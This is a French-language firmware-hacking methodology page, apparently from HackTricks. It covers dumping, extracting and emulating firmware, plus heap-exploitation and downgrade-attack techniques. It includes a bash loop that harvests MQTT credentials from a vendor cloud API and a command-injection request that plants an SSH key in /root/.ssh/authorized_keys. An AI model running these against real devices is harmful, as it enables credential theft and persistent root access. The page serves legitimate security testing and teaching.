# Analyse du Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Ressources associées


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux devices de fonctionner correctement en gérant et en facilitant la communication entre les composants hardware et le software avec lequel les users interagissent. Il est stocké dans une mémoire permanente, garantissant que le device puisse accéder à des instructions vitales dès sa mise sous tension, ce qui déclenche le lancement du operating system. Examiner et éventuellement modifier le firmware est une étape critique pour identifier des vulnérabilités de sécurité.

## **Collecte d'informations**

La **collecte d'informations** est une étape initiale critique pour comprendre la composition d'un device et les technologies qu'il utilise. Ce processus consiste à collecter des données sur :

- L'architecture du CPU et le operating system qu'il exécute
- Les spécificités du bootloader
- La disposition du hardware et les datasheets
- Les métriques de la codebase et les emplacements du source
- Les external libraries et les types de license
- L'historique des mises à jour et les certifications réglementaires
- Les diagrammes d'architecture et de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

À cette fin, les outils de **open-source intelligence (OSINT)** sont inestimables, tout comme l'analyse de tous les composants de software open-source disponibles via des processus de revue manuelle et automatisée. Des outils comme [Coverity Scan](https://scan.coverity.com) et [Semmle’s LGTM](https://lgtm.com/#explore) offrent une analyse statique gratuite qui peut être exploitée pour trouver des problèmes potentiels.

## **Acquisition du Firmware**

L'obtention du firmware peut être abordée de différentes manières, chacune avec son propre niveau de complexité :

- **Directement** depuis la source (developers, manufacturers)
- En le **building** à partir des instructions fournies
- En le **downloading** depuis les sites d'assistance officiels
- En utilisant des requêtes **Google dork** pour trouver des fichiers firmware hébergés
- En accédant directement au **cloud storage**, avec des outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- En interceptant les **updates** via des techniques man-in-the-middle
- En **extracting** depuis le device via des connexions comme **UART**, **JTAG**, ou **PICit**
- En **sniffing** les requêtes de mise à jour dans la communication du device
- En identifiant et en utilisant des **hardcoded update endpoints**
- En **dumping** depuis le bootloader ou le network
- En **removing and reading** la puce de stockage, quand tout le reste échoue, en utilisant les outils hardware appropriés

### UART-only logs: force a root shell via U-Boot env in flash

Si le UART RX est ignoré (logs only), vous pouvez quand même forcer un init shell en **modifiant le blob U-Boot environment** hors ligne :

1. Dump le SPI flash avec une pince SOIC-8 + programmeur (3.3V) :
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localisez la partition U-Boot env, modifiez `bootargs` pour inclure `init=/bin/sh`, et **recalculez le CRC32 de U-Boot env** pour le blob.
3. Réécrivez uniquement la partition env et redémarrez ; un shell devrait apparaître sur UART.

Ceci est utile sur les embedded devices où le shell du bootloader est désactivé mais où la partition env est inscriptible via un accès externe au flash.

## Analyzing the firmware

Maintenant que vous **have the firmware**, vous devez extraire des informations à son sujet pour savoir comment le traiter. Différents outils que vous pouvez utiliser pour cela :
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si tu ne trouves pas grand-chose avec ces tools, vérifie l’**entropy** de l’image avec `binwalk -E <bin>` ; si elle est faible, alors il est peu probable qu’elle soit encrypted. Si elle est élevée, elle est probablement encrypted (ou compressed d’une certaine manière).

De plus, tu peux utiliser ces tools pour extraire des **files embedded inside the firmware** :


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour inspecter le file.

### Getting the Filesystem

Avec les tools commentés précédemment comme `binwalk -ev <bin>`, tu aurais dû pouvoir **extraire le filesystem**.\
Binwalk l’extrait généralement dans un **folder nommé d’après le type de filesystem**, qui est généralement l’un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Parfois, binwalk **n’aura pas le magic byte du filesystem dans ses signatures**. Dans ces cas, utilise binwalk pour **trouver l’offset du filesystem et carve le compressed filesystem** depuis le binary, puis **extraire manuellement** le filesystem selon son type en utilisant les étapes ci-dessous.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Exécutez la commande **dd** suivante pour extraire le système de fichiers Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativement, la commande suivante peut aussi être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l'exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire "`squashfs-root`".

- Fichiers d'archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs avec NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyser le Firmware

Une fois le firmware obtenu, il est essentiel de l'examiner pour comprendre sa structure et ses vulnérabilités potentielles. Ce processus consiste à utiliser divers outils pour analyser et extraire des données précieuses de l'image du firmware.

### Outils d'analyse initiale

Un ensemble de commandes est fourni pour l'inspection initiale du fichier binaire (appelé `<bin>`). Ces commandes aident à identifier les types de fichiers, extraire des chaînes, analyser les données binaires et comprendre les détails de la partition et du filesystem :
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Pour évaluer l’état du chiffrement de l’image, l’**entropy** est vérifiée avec `binwalk -E <bin>`. Une faible entropy suggère une absence de chiffrement, tandis qu’une entropy élevée indique un possible chiffrement ou une compression.

Pour extraire des **embedded files**, des outils et ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour l’inspection de fichiers sont recommandés.

### Extraction du Filesystem

En utilisant `binwalk -ev <bin>`, on peut généralement extraire le filesystem, souvent dans un répertoire nommé d’après le type de filesystem (par ex., squashfs, ubifs). Cependant, lorsque **binwalk** ne parvient pas à reconnaître le type de filesystem en raison de l’absence de magic bytes, une extraction manuelle est nécessaire. Cela implique d’utiliser `binwalk` pour localiser l’offset du filesystem, puis la commande `dd` pour extraire le filesystem :
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Ensuite, selon le type de filesystem (par ex. squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour extraire manuellement le contenu.

### Analyse du filesystem

Une fois le filesystem extrait, la recherche de failles de sécurité commence. L’attention se porte sur les daemons réseau non sécurisés, les identifiants codés en dur, les endpoints API, les fonctionnalités du serveur de mise à jour, le code non compilé, les scripts de démarrage et les binaires compilés pour une analyse hors ligne.

**Les emplacements clés** et **éléments** à inspecter incluent :

- **etc/shadow** et **etc/passwd** pour les identifiants utilisateur
- Les certificats et clés SSL dans **etc/ssl**
- Les fichiers de configuration et de script pour des vulnérabilités potentielles
- Les binaires embarqués pour une analyse plus poussée
- Les web servers et binaires courants des appareils IoT

Plusieurs outils aident à découvrir des informations sensibles et des vulnérabilités dans le filesystem :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour la recherche d'informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), et [**EMBA**](https://github.com/e-m-b-a/emba) pour l'analyse statique et dynamique

### Vérifications de sécurité sur les binaires compilés

Le code source comme les binaires compilés trouvés dans le filesystem doivent être examinés pour détecter des vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows aident à identifier les binaires non protégés qui pourraient être exploités.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Many IoT hubs fetch their per-device configuration from a cloud endpoint that looks like:

- `https://<api-host>/pf/<deviceId>/<token>`

During firmware analysis you may find that `<token>` is derived locally from the device ID using a hardcoded secret, for example:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

This design enables anyone who learns a deviceId and the STATIC_KEY to reconstruct the URL and pull cloud config, often revealing plaintext MQTT credentials and topic prefixes.

Practical workflow:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Recherchez les lignes qui impriment le pattern d'URL de la configuration cloud et l'adresse du broker, par exemple :
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Récupérer STATIC_KEY et l'algorithme du token à partir du firmware

- Chargez les binaires dans Ghidra/radare2 et cherchez le chemin de config ("/pf/") ou l'utilisation de MD5.
- Confirmez l'algorithme (par ex. MD5(deviceId||STATIC_KEY)).
- Dérivez le token en Bash et mettez le digest en majuscules :
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Récolter la config cloud et les identifiants MQTT

- Composer l'URL et récupérer le JSON avec curl ; parser avec jq pour extraire les secrets :
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuser MQTT en clair et les ACL de topic faibles (si présentes)

- Utilisez les identifiants récupérés pour vous abonner aux topics de maintenance et rechercher des événements sensibles :
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Énumérer les IDs d’appareil prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des bytes OUI/product/type du vendor suivis d’un suffixe séquentiel.
- Vous pouvez itérer des IDs candidats, dériver des tokens et récupérer des configs programmatiquement :
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Toujours obtenir une autorisation explicite avant de tenter une énumération massive.
- Préférer l’émulation ou l’analyse statique pour récupérer des secrets sans modifier le hardware cible lorsque c’est possible.


Le processus d’émulation du firmware permet une **dynamic analysis** soit du fonctionnement d’un device, soit d’un programme individuel. Cette approche peut rencontrer des difficultés liées au hardware ou aux dépendances d’architecture, mais le transfert du root filesystem ou de binaires spécifiques vers un device avec une architecture et un endianness correspondants, comme un Raspberry Pi, ou vers une machine virtuelle préconstruite, peut faciliter des tests supplémentaires.

### Emulating Individual Binaries

Pour examiner des programmes uniques, l’identification de l’endianness et de l’architecture CPU du programme est cruciale.

#### Example with MIPS Architecture

Pour émuler un binaire d’architecture MIPS, on peut utiliser la commande :
```bash
file ./squashfs-root/bin/busybox
```
Et pour installer les outils d'émulation nécessaires :
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Pour MIPS (big-endian), `qemu-mips` est utilisé, et pour les binaires little-endian, `qemu-mipsel` serait le choix.

#### ARM Architecture Emulation

Pour les binaires ARM, le processus est similaire, avec l'émulateur `qemu-arm` utilisé pour l'émulation.

### Full System Emulation

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), et d'autres, facilitent l'émulation complète du firmware, automatisant le processus et aidant à l'analyse dynamique.

## Dynamic Analysis in Practice

À ce stade, soit un environnement de device réel, soit un environnement émulé est utilisé pour l'analyse. Il est essentiel de conserver un accès shell à l'OS et au filesystem. L'émulation peut ne pas reproduire parfaitement les interactions hardware, nécessitant parfois des redémarrages de l'émulation. L'analyse doit revisiter le filesystem, exploiter les webpages et network services exposés, et explorer les vulnerabilities du bootloader. Les tests d'intégrité du firmware sont critiques pour identifier de potentielles vulnerabilities backdoor.

## Runtime Analysis Techniques

L'analyse runtime consiste à interagir avec un process ou un binary dans son environnement d'exploitation, en utilisant des outils comme gdb-multiarch, Frida, et Ghidra pour poser des breakpoints et identifier des vulnerabilities via le fuzzing et d'autres techniques.

Pour les targets embedded sans debugger complet, **copiez un `gdbserver` statiquement lié** sur le device et attachez-vous à distance :
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mappage des messages Zigbee / radio co-processor

Sur les hubs IoT, la pile RF est souvent séparée entre un **radio MCU** et un processus Linux userland. Un workflow utile consiste à mapper le chemin :

1. **RF frame** sur l’air
2. **controller-side parser** sur le radio MCU
3. protocole texte **serial/UART** ou TLV transmis à Linux (par exemple `/dev/tty*`)
4. **application dispatcher** dans le daemon principal
5. **protocol-specific handler / state machine**

Cette architecture crée deux cibles de reversing au lieu d’une. Si le controller convertit des trames radio binaires en un protocole textuel comme `Group,Command,arg1,arg2,...`, récupérez :

- Les **message groups** et les tables de dispatch
- Quels messages peuvent venir du **network** plutôt que du controller lui-même
- Les champs discriminants **manufacturer-specific** exacts (par exemple Zigbee `manufacturer_code` et `cluster_command` custom)
- Quels handlers ne sont atteignables que pendant les phases de **commissioning**, de discovery ou de téléchargement de firmware/model

Pour Zigbee en particulier, capturez le trafic de pairing et vérifiez si la cible repose toujours sur la **Link Key** par défaut `ZigBeeAlliance09`. Si c’est le cas, l’écoute du trafic de commissioning peut exposer la **Network Key**. Les install codes Zigbee 3.0 réduisent cette exposition, donc notez si l’appareil testé les impose réellement.

### Protocol handlers manufacturer-specific et reachability contrôlée par FSM

Les commandes Zigbee/ZCL vendor-specific sont souvent une meilleure cible que les clusters standardisés car elles alimentent du **custom parsing code** et des **FSMs** internes avec moins de validation éprouvée.

Workflow pratique :

- Reversez le command dispatcher jusqu’à trouver le **vendor-only handler**.
- Récupérez les tables **FSM state**, **event**, **check**, **action** et **next-state**.
- Identifiez les **transitional states** qui avancent automatiquement ainsi que les branches retry/error qui finissent par reset ou free l’état contrôlé par l’attaquant.
- Confirmez quels échanges protocolaires légitimes sont nécessaires pour placer le daemon dans l’état vulnérable au lieu de supposer que le handler buggy est toujours atteignable.

Pour les protocoles sensibles au timing, le replay de paquets depuis un framework Python peut être trop lent. Une approche plus fiable consiste à émuler un appareil légitime sur du matériel réel (par exemple un **nRF52840**) avec un stack de niveau vendor pour exposer les bons **endpoints**, **attributes** et le bon timing de commissioning.

### Classe de bugs de téléchargements fragmentés dans les daemons embedded

Une classe récurrente de bugs firmware apparaît dans les **fragmented blob/model/configuration downloads** :

1. Le **premier fragment** (`offset == 0`) stocke `ctx->total_size` et alloue `malloc(total_size)`.
2. Les fragments suivants ne valident que les champs **packet-local** contrôlés par l’attaquant, comme `packet_total_size >= offset + chunk_len`.
3. La copie utilise `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sans vérifier la **taille allouée d’origine**.

Cela permet à un attaquant d’envoyer :

- Un premier fragment valide avec une taille totale déclarée **petite** pour forcer une petite allocation heap.
- Un fragment suivant avec le **offset** attendu mais un `chunk_len` plus grand.
- Une taille packet-local usurpée qui satisfait les nouvelles vérifications tout en overflowant toujours le buffer alloué à l’origine.

Lorsque le chemin vulnérable est derrière une logique de commissioning, l’exploitation doit inclure assez de **device emulation** pour amener la cible dans l’état attendu de model-download ou blob-download avant d’envoyer les fragments malformés.

### Déclencheurs `free()` pilotés par le protocole

Dans les daemons embedded, le moyen le plus simple de déclencher une exploitation des métadonnées heap n’est souvent pas d’"attendre le cleanup" mais de **forcer la propre gestion d’erreur du protocole** :

- Envoyez des fragments de suivi malformés pour pousser la FSM dans des états **retry** ou **error**.
- Dépassez le seuil de retry pour que le daemon **reset context** et free le buffer corrompu.
- Utilisez ce `free()` prévisible pour déclencher des primitives côté allocateur avant que le process ne crashe pour d’autres raisons.

C’est particulièrement utile contre les allocateurs **musl/uClibc/dlmalloc-like** dans embedded Linux, où corrompre les métadonnées d’un chunk peut transformer la logique unlink/unbin en primitive d’écriture. Un pattern stable consiste à corrompre un **size field** pour rediriger la traversée de l’allocateur vers des **fake chunks staging inside the overflowed buffer**, au lieu d’écraser immédiatement de vrais pointeurs de bin et de faire crasher le process.

## Binary Exploitation et Proof-of-Concept

Développer un PoC pour des vulnérabilités identifiées nécessite une compréhension approfondie de l’architecture cible et de la programmation dans des langages de plus bas niveau. Les protections runtime binaires dans les systèmes embarqués sont rares, mais lorsqu’elles sont présentes, des techniques comme Return Oriented Programming (ROP) peuvent être nécessaires.

### Notes d’exploitation uClibc fastbin (embedded Linux)

- **Fastbins + consolidation:** uClibc utilise des fastbins similaires à glibc. Une allocation large ultérieure peut déclencher `__malloc_consolidate()`, donc tout fake chunk doit survivre aux checks (taille cohérente, `fd = 0`, et chunks voisins vus comme "in use").
- **Binaires non-PIE sous ASLR :** si ASLR est activé mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` dans le binaire sont stables. Vous pouvez cibler une zone qui ressemble déjà à un en-tête de heap chunk valide pour faire tomber une allocation fastbin sur une **function pointer table**.
- **Parser-stopping NUL :** quand JSON est parsé, un `\x00` dans le payload peut arrêter le parsing tout en conservant des octets trailants contrôlés par l’attaquant pour un stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem` :** un ROP chain qui appelle `open("/proc/self/mem")`, `lseek()` et `write()` peut déposer du shellcode exécutable dans un mapping connu et y sauter.

## Operating Systems préparés pour l’analyse de firmware

Des operating systems comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour les tests de sécurité firmware, avec les outils nécessaires.

## OS préparés pour analyser le Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos) : AttifyOS est une distribution conçue pour vous aider à réaliser des security assessment et du pentesting de dispositifs Internet of Things (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires déjà chargés.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS) : système d’exploitation de tests de sécurité embedded basé sur Ubuntu 18.04, préchargé avec des outils de test de sécurité firmware.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Même lorsqu’un vendor implémente des vérifications de signature cryptographique pour les images firmware, la **version rollback (downgrade) protection** est fréquemment omise. Lorsque le boot- ou recovery-loader vérifie seulement la signature avec une clé publique embarquée mais ne compare pas la *version* (ou un compteur monotone) de l’image flashée, un attaquant peut légitimement installer un **ancien firmware vulnérable qui porte toujours une signature valide** et réintroduire ainsi des vulnérabilités patchées.

Workflow d’attaque typique :

1. **Obtenir une ancienne image signée**
* La récupérer depuis le portail de téléchargement public du vendor, un CDN ou le site de support.
* L’extraire depuis des applications mobiles/desktop compagnons (par exemple dans un Android APK sous `assets/firmware/`).
* La récupérer depuis des dépôts tiers comme VirusTotal, des archives Internet, des forums, etc.
2. **Uploader ou servir l’image à l’appareil** via n’importe quel canal de mise à jour exposé :
* Web UI, API d’application mobile, USB, TFTP, MQTT, etc.
* De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *non authentifiés* qui acceptent des blobs firmware encodés en Base64, les décodent côté serveur et déclenchent recovery/upgrade.
3. Après le downgrade, exploitez une vulnérabilité corrigée dans la version plus récente (par exemple un filtre de command-injection ajouté plus tard).
4. Optionnellement, reflashez la dernière image ou désactivez les mises à jour pour éviter la détection une fois la persistance obtenue.

### Exemple : Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Dans le firmware vulnérable (downgradé), le paramètre `md5` est concaténé directement dans une commande shell sans sanitisation, ce qui permet l’injection de commandes arbitraires (ici – activation de l’accès root par clé SSH). Les versions ultérieures du firmware ont introduit un filtre de caractères basique, mais l’absence de protection contre le downgrade rend ce correctif inutile.

### Extraction du Firmware depuis des Applications Mobiles

De nombreux vendors intègrent des images complètes de firmware dans leurs applications mobiles compagnon afin que l’app puisse mettre à jour l’appareil via Bluetooth/Wi-Fi. Ces packages sont généralement stockés non chiffrés dans l’APK/APEX sous des chemins comme `assets/fw/` ou `res/raw/`. Des outils comme `apktool`, `ghidra`, ou même un simple `unzip` permettent d’extraire des images signées sans toucher au matériel physique.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist pour évaluer la logique de mise à jour

* Le transport/l’authentification du *update endpoint* est-il correctement protégé (TLS + authentication) ?
* L’appareil compare-t-il les **version numbers** ou un **monotonic anti-rollback counter** avant le flash ?
* L’image est-elle vérifiée dans une secure boot chain (par ex. signatures vérifiées par le code ROM) ?
* Le code userland effectue-t-il des vérifications de cohérence supplémentaires (par ex. partition map autorisée, model number) ?
* Les flux de mise à jour *partial* ou *backup* réutilisent-ils la même logique de validation ?

> 💡  Si l’un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux rollback attacks.

## Firmware vulnérable pour s’entraîner

Pour s’entraîner à découvrir des vulnérabilités dans le firmware, utilisez les projets de firmware vulnérables suivants comme point de départ.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Formation et Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Références

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
